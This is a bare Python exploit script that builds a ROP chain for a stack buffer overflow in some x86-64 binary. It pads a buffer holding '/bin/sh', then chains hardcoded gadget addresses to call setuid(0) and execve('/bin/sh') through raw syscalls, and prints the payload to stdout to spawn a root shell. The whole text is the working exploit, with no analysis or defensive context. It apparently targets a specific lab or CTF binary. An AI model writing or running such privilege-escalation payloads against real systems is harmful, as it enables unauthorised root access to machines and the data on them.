#!/usr/bin/env python3

from struct import pack
import sys
setuid_syscall = 105 
execve_syscall = 59
pop_rax = 0x0000000000456587 #pop rax ; ret
pop_rdi = 0x000000000040250f #pop rdi ; ret
pop_rsi = 0x000000000040a57e #pop rsi ; ret
pop_rdx_rbx = 0x000000000048c0ab #pop rdx; pop rbx ; ret
syscall = 0x000000000041b506 #syscall ; ret

buffer_address = 0x7ffffff0a340
bin_sh = b"/bin/sh\x00"

padding = b"A" * 112
combined = bin_sh + padding

combined += pack("<Q", pop_rdi)
combined += pack("<Q", 0)
combined += pack("<Q", pop_rax)
combined += pack("<Q", setuid_syscall)
combined += pack("<Q", syscall)

combined += pack("<Q", pop_rdi)
combined += pack("<Q", buffer_address)
combined += pack("<Q", pop_rsi)
combined += pack("<Q", 0)
combined += pack("<Q", pop_rdx_rbx)
combined += pack("<Q", 0)
combined += pack("<Q", 0)
combined += pack("<Q", pop_rax)
combined += pack("<Q", execve_syscall)
combined += pack("<Q", syscall)

sys.stdout.buffer.write(combined)